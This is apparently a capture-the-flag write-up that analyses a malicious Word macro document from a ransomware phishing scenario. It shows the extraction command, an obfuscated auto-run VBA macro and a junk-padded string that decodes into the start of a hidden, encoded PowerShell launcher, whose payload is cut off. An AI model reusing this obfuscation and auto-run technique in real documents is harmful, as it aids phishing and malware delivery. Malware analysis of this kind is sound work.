# Emo

> **WearRansom ransomware just got loose in our company. The SOC has traced the**
> **initial access to a phishing attack, a Word document with macros. Take a look**
> **at the document and see if you can find anything else about the malware and**
> **perhaps a flag.**

## The maldoc

The document macros can be extracted with:

```bash
olevba2 --deobf --decode emo.doc
```

This decodes the hex strings but the VBA code is still obfuscated:

```vba
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1
Private Sub Document_open()
Get4ipjzmjfvp.X8twf_cydt6
End Sub
Function X4al3i4glox(Gav481k8nh28)
X4al3i4glox = Replace(Gav481k8nh28, "][(s)]w", Sxybmdt069cn)
End Function
```

## Interpretation

The most efficient, most tempting, action is to just run the code.
But I'm on my Linux laptop, not powerful enough for a Windows VM.

So let's just try and make sense of the code.

The previous snippet is run at the opening of the document. It replaces the
string "][(s)]w" with something.

There's a huge string in emo filled with these:

```
][(s)]w][(s)]wP][(s)]wO][(s)]ww][(s)]we][(s)]wr][(s)]ws][(s)]wh][(s)]we][(s)]wL][(s)]wL][(s)]w ][(s)]w-][(s)]ww][(s)]wi][(s)]wn][(s)]wd][(s)]wo][(s)]ww][(s)]ws][(s)]wt][(s)]wy][(s)]wl][(s)]we][(s)]w ][(s)]wh][(s)]wi][(s)]wd][(s)]wd][(s)]we][(s)]wn][(s)]w ][(s)]w-][(s)]wE][(s)]wN][(s)]wC][(s)]wO][(s)]wD][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]wIPA][(s)]wABY][(s)]wTKA][(s)]wYFz][(s)]wYXA][(s)]wpIy][(s)]wAdA][(s)]wxgD][(s)]wAfD][(s)]wLAr][(s)]wAVe][(s)]wDgG][(s)]wBuY][(s)]wtAH][(s)]wCyA][(s)]wwAY][(s)]wKTA
```

Which translates to `POwersheLL -windowstyle hidden -ENCOD                 IPAABYTK...`, after removing "][(s)]w".

